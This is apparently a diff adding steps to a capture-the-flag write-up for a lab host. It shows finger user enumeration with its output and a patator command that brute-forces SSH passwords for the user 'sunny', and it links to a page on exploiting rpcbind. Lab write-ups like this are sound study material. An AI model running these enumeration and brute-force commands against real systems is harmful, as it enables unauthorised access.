@@ -18,3 +18,26 @@ Trying various manual enumerations didn't yield much fruits so I run metasploit 
 [+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, bin, daemon, dladm, gdm, listen, lp, mysql, noaccess, 
 nobody, nobody4, nuucp, openldap, postgres, root, svctag, sys, uucp, xvm
 
+└─# ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
+access@10.10.10.76
+admin@10.10.10.76
+anne marie@10.10.10.76
+bin@10.10.10.76
+dee dee@10.10.10.76
+jo ann@10.10.10.76
+la verne@10.10.10.76
+line@10.10.10.76
+message@10.10.10.76
+miof mela@10.10.10.76        
+root@10.10.10.76
+sammy@10.10.10.76
+sunny@10.10.10.76
+sys@10.10.10.76
+zsa zsa@10.10.10.76
+
+Now we need to bruteforce the password:
+└─# patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'
+
+
+Interesting reference on rpcbind
+└─# https://crazeofcyber.blogspot.com/2019/10/exploit-rpcbind.html
